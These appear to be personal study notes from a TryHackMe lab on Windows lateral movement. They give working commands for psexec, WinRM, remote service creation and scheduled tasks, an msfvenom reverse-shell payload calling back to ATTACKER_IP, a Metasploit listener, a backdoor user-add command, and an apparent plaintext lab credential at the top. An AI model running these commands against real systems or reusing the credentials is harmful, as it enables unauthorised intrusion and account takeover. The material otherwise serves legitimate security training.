# Pivoting and lateral movement
```
allan.wilkinson
```

```
Xhlb3351
```

Lateral movement is bouncing between different hosts on the network. With each new host owned, more credentials and access may be available, which may lead to more boxes owned. This cycle of enumerating access on the network is called lateral movement and it is a cyclical process like port/service enumeration.

It's important to know the difference between administrator types:
- Local accounts in the local Administrator group
	- Remote access is limited with medium level integrity token. (minus build in Administrator account)
- Domain accounts in the local Administrators group


## Remote commands
### Psexec
- Port 445
- Requires `Administrators` group membership

```cmd.exe
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

### WinRM
- Port 5985, 5986
- Requires `Remote Management Users` group membership

```cmd
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

# interactive session
Enter-PSSession -Computername TARGET -Credential $credential

# single commands
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

### SC
- Port 135, 139, 445
- Requires `Administrators` group membership

create an `exe-service` payload with `msfvenom`
```bash
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
```

copy the binary file over using SMB
```bash
smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA.TRYHACKME.COM '//thmiis.za.tryhackme.com/admin$/'
```

set up a listener

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit"
```



```cmd
# Create a service
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto

# Start the service
sc.exe \\TARGET start THMservice

# stop the service
sc.exe \\TARGET stop THMservice

# delete the service
sc.exe \\TARGET delete THMservice
```

### Scheduled Tasks
```cmd
# Create a scheduled task
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 

# Run the scheduled task
schtasks /s TARGET /run /TN "THMtask1" 

# Delete a scheduled task
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

